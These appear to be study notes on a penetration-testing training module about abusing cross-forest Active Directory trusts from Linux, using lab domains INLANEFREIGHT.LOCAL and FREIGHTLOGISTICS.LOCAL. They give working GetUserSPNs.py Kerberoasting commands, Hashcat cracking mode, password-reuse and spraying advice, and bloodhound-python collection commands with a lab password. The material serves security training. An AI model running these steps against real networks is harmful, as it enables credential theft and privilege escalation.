![Image](https://images.openai.com/static-rsc-4/l4QQtak5Ajp_aEkqLy9e0BXgRPspIhleerona55S9dYe48AOvDFaOW4O8xHypAgXagZRo9X21OxnDuQ5c1lLGxczAFr0p5mPViAuVHbNnBT_CQIBUWPPsjUJ26aev2_XsQbuv77ygioouFul3su3tsxDxm6OeySxO6G5w1XaFAt4EEY3APn-02Itu9e8NYL3?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/OrSTLd80dYez7NR79LVDTxcq7PHJB7qFqjJp-KqLMCLxvNLaJjSVfkNtlwk_EBDnRAjPseG6zH14dTPSWF1iEe__-FCOkZIsj_DRFY-j2KfaWrjvcyeeeJF8MxsXwNWXiUNKRYS17p2a-0NdLTxevdAHrxhNzge2NFEVtyozv86nmIHpLboIhe8jOmrWHBMp?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/noV3QTK60U1KDGrb5z9QElo_b0Qg-66E9jo32NxlR3-dZUK73sixy1kQsDYzkZR_wzvnVWSM2rozbBRCIuzpZ3h3Y7ph-tJfr8ucPNdmuAi4onxc898qUg3iWv8eqi2moLtMejU9R9hK4WCKiGcV2YjmZZ3UFy3-cwjwnxN_S5ojwWYIn5BNh-TQn70G_B4F?purpose=fullsize)
## Overview

In this section, we examine how a **forest trust** can potentially be used to perform attacks across domains.

The two main topics covered are:

1. **Cross-Forest Kerberoasting**
    
2. **Hunting Foreign Group Membership with BloodHound-python**
    

The module demonstrates these techniques from a **Linux attack host**.

---

# 1. Cross-Forest Kerberoasting

As discussed in the previous section, it is often possible to perform **Kerberoasting across a forest trust**.

If this is possible in the environment being assessed, we can use:

```text
GetUserSPNs.py
```

from our Linux attack host.

To perform this attack, we need:

- Credentials for a user who can authenticate into the other domain.
    
- The target domain specified using:
    

```text
-target-domain
```

In this example, the target domain is:

```text
FREIGHTLOGISTICS.LOCAL
```

The source domain is:

```text
INLANEFREIGHT.LOCAL
```

The module identifies one SPN entry for the:

```text
mssqlsvc
```

account.

---

# 2. Using GetUserSPNs.py

The module uses:

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

The resulting output shows:

```text
ServicePrincipalName                 Name      MemberOf
-----------------------------------  --------  ------------------------------------------------------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Other information shown includes:

```text
PasswordLastSet
LastLogon
Delegation
```

### Important finding

The service account is:

```text
mssqlsvc
```

Its SPN is:

```text
MSSQLsvc/sql01.freightlogstics:1433
```

And its group membership is:

```text
CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Therefore, the account is associated with the:

```text
Domain Admins
```

group in:

```text
FREIGHTLOGISTICS.LOCAL
```

---

# 3. Requesting the TGS Ticket

After identifying the SPN, the module reruns the command with:

```text
-request
```

This requests the TGS ticket.

Command:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

The important part of the output is:

```text
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$...
```

This gives us a Kerberos TGS hash that can be saved and processed offline.

The module also notes that we can use:

```text
-outputfile <OUTPUT FILE>
```

to directly save the output to a file.

Example structure:

```bash
GetUserSPNs.py -request \
-target-domain FREIGHTLOGISTICS.LOCAL \
INLANEFREIGHT.LOCAL/wley \
-outputfile <OUTPUT FILE>
```

---

# 4. Offline Password Cracking

The obtained TGS can be attacked offline using Hashcat.

The module specifies Hashcat mode:

```text
13100
```

Therefore, the general process is:

```text
GetUserSPNs.py
       │
       ▼
     SPN
       │
       ▼
   TGS Ticket
       │
       ▼
  Kerberos Hash
       │
       ▼
    Hashcat
       │
       ▼
Recovered Password
```

If the password is successfully recovered, the module explains that the credentials could potentially allow authentication into:

```text
FREIGHTLOGISTICS.LOCAL
```

as the privileged account.

---

# 5. Password Reuse

The module emphasizes that after successfully performing this type of attack, we should also consider **password reuse**.

For example, we may find that an account with a similar name exists in the current domain.

Conceptually:

```text
Domain A                         Domain B

mssqlsvc  ───── same password ───► mssqlsvc
```

The module specifically recommends checking whether the compromised account exists in the current domain and whether password reuse exists.

This can potentially provide another route if privilege escalation in the current domain has not yet been achieved.

---

# 6. Password Spray Consideration

The module also discusses the possibility of attempting a **single password spray** with the recovered password.

The reasoning given is that the same administrators may manage both trusted domains and could potentially reuse passwords for other service accounts.

The important idea is:

```text
Cracked password
       │
       ▼
Check for reuse
       │
       ▼
Other accounts / service accounts
       │
       ▼
Potential additional access
```

This is presented by the module as another example of **iterative testing**.

> Leave no stone unturned when investigating trust relationships.

---

# 7. Hunting Foreign Group Membership with BloodHound-python

The second major topic is:

```text
Foreign Group Membership
```

Sometimes users or administrators from one domain can be members of groups in another domain.

The module explains that:

```text
Domain Local Groups
```

allow users from outside their forest.

Therefore, with a **bidirectional forest trust**, it is possible to encounter situations where a highly privileged user from one domain is a member of a built-in administrative group in another domain.

Example:

```text
INLANEFREIGHT.LOCAL
        │
        │ Administrator
        ▼
FREIGHTLOGISTICS.LOCAL
        │
        ▼
Administrators
```

This type of relationship can be investigated using:

```text
BloodHound-python
```

---

# 8. BloodHound-python

The module refers to the Python implementation of BloodHound:

```text
BloodHound.py
```

It can collect information from multiple domains and allow the results to be imported into the BloodHound GUI.

The purpose here is to identify relationships such as:

```text
User
  │
  ▼
Foreign Domain
  │
  ▼
Group Membership
  │
  ▼
Administrative Access
```

---

# 9. DNS Requirement

An important practical issue when running BloodHound-python from Linux is **DNS resolution**.

The module explains that the tool requires a DNS hostname for the target Domain Controller rather than simply an IP address.

If the attack host does not have the appropriate internal DNS configuration, `/etc/resolv.conf` can be modified.

---

# 10. Configuring `/etc/resolv.conf` for INLANEFREIGHT.LOCAL

The module provides:

```text
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

The important configuration is:

```text
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

Here:

```text
INLANEFREIGHT.LOCAL
```

is the domain.

And:

```text
172.16.5.5
```

is the DNS server being used in the module's example.

---

# 11. Running BloodHound-python Against INLANEFREIGHT.LOCAL

The module uses:

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

### Parameters

|Parameter|Meaning|
|---|---|
|`-d`|Domain|
|`-dc`|Domain Controller|
|`-c All`|Collection method|
|`-u`|Username|
|`-p`|Password|

The module's output includes:

```text
INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
```

### Information collected

The output demonstrates that BloodHound-python can discover:

```text
Domains
Computers
Users
Groups
Trusts
```

---

# 12. Compressing the BloodHound Data

After collection, BloodHound-python generates JSON files.

The module shows:

```bash
zip -r ilfreight_bh.zip *.json
```

Example output:

```text
adding: 20220329140127_computers.json
adding: 20220329140127_domains.json
adding: 20220329140127_groups.json
adding: 20220329140127_users.json
```

The purpose is to create one ZIP file containing the collected BloodHound data.

This can then be uploaded into the BloodHound GUI.

---

# 13. Configuring `/etc/resolv.conf` for FREIGHTLOGISTICS.LOCAL

The module repeats the process for the second domain.

Configuration shown in the module:

```text
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

Complete relevant section:

```text
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

The important change is:

```text
domain FREIGHTLOGISTICS.LOCAL
```

and:

```text
nameserver 172.16.5.238
```

---

# 14. Running BloodHound-python Against FREIGHTLOGISTICS.LOCAL

The module uses:

```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

The target Domain Controller is:

```text
ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
```

The authentication account is specified as:

```text
forend@inlanefreight.local
```

The module's output includes:

```text
INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```

---

# 15. Comparing the Two BloodHound Collections

The module demonstrates collection from both domains.

### INLANEFREIGHT.LOCAL

```text
Domain:
INLANEFREIGHT.LOCAL

DC:
ACADEMY-EA-DC01

Computers:
559

Users:
2950

Groups:
183

Trusts:
2
```

### FREIGHTLOGISTICS.LOCAL

```text
Domain:
FREIGHTLOGISTICS.LOCAL

DC:
ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

Computers:
5

Users:
9

Groups:
52

Trusts:
1
```

These results can then be imported into BloodHound.

---

# 16. Viewing Foreign Domain Group Membership

After uploading the second set of BloodHound data, the module instructs us to navigate to:

```text
Analysis
    ↓
Users with Foreign Domain Group Membership
```

Then select:

```text
Source Domain:
INLANEFREIGHT.LOCAL
```

The module states that we will see the built-in:

```text
Administrator
```

account from:

```text
INLANEFREIGHT.LOCAL
```

as a member of the built-in:

```text
Administrators
```

group in:

```text
FREIGHTLOGISTICS.LOCAL
```

The relationship can therefore be represented as:

```text
ADMINISTRATOR@INLANEFREIGHT.LOCAL
                  │
                  │ Member of
                  ▼
ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL
```

This is the type of cross-domain relationship that BloodHound helps identify visually.

---

# 17. Important Attack Chain From This Section

The entire Linux portion can be remembered as:

```text
                 CROSS-FOREST TRUST
                        │
            ┌───────────┴───────────┐
            │                       │
            ▼                       ▼
     Cross-Forest             Foreign Group
     Kerberoasting             Membership
            │                       │
            ▼                       ▼
     GetUserSPNs.py           BloodHound.py
            │                       │
            ▼                       ▼
       Find SPNs             Collect AD Data
            │                       │
            ▼                       ▼
       Request TGS            Import into GUI
            │                       │
            ▼                       ▼
       Obtain Hash             Analyze Groups
            │                       │
            ▼                       ▼
         Hashcat              Foreign Membership
            │
            ▼
      Password Reuse
```

---

# 18. Key Commands From the Module

## Cross-Forest Kerberoasting

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Request the TGS:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Optional output:

```text
-outputfile <OUTPUT FILE>
```

Hashcat:

```text
Mode: 13100
```

---

## INLANEFREIGHT BloodHound

DNS:

```text
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

Collection:

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

Compression:

```bash
zip -r ilfreight_bh.zip *.json
```

---

## FREIGHTLOGISTICS BloodHound

DNS:

```text
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

Collection:

```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

---

# 19. Important Things to Remember

### Cross-Forest Kerberoasting

```text
GetUserSPNs.py
        ↓
-target-domain
        ↓
Find SPN
        ↓
-request
        ↓
TGS hash
        ↓
Hashcat 13100
```

### Foreign Group Membership

```text
BloodHound-python
        ↓
Collect domain information
        ↓
Collect both domains
        ↓
Import JSON
        ↓
Analysis
        ↓
Users with Foreign Domain Group Membership
```

### Critical concepts

- A forest trust can provide authentication/access paths between domains.
    
- `GetUserSPNs.py` can be used to enumerate SPNs across the trust when the necessary authentication is available.
    
- `-target-domain` specifies the target domain.
    
- `-request` requests the TGS.
    
- Kerberos TGS hashes can be attacked offline.
    
- Hashcat mode for the example is `13100`.
    
- Password reuse should be considered after obtaining a privileged credential.
    
- BloodHound-python can collect information from trusted domains.
    
- Correct DNS configuration is important when using BloodHound-python.
    
- Foreign group membership can reveal users from one domain who have group membership in another.
    
- The module's BloodHound example uses **Users with Foreign Domain Group Membership** to identify this relationship.
    

---

# 20. Closing Thoughts on Trusts

The module concludes that domain trusts can provide several ways to gain additional access.

For example:

```text
Current Domain
      │
      ▼
Trust Relationship
      │
      ▼
Trusted Domain
      │
      ├── Kerberoasting
      │
      ├── Password Reuse
      │
      └── Foreign Group Membership
```

The important lesson is that domain trusts create additional relationships that must be examined during an assessment.

The module emphasizes that domain trusts are a large and complex topic, and this section provides a practical introduction to:

```text
Cross-Forest Kerberoasting
        +
Foreign Group Membership
        +
BloodHound Enumeration
```

These techniques can reveal additional attack paths that may not be visible when examining only the current domain.

**Note:** I intentionally did **not** add the Windows/Rubeus procedure, ExtraSIDs procedure, or other trust-abuse techniques here. This set of notes stays limited to the **“Cross-Forest Trust Abuse — from Linux”** section you provided.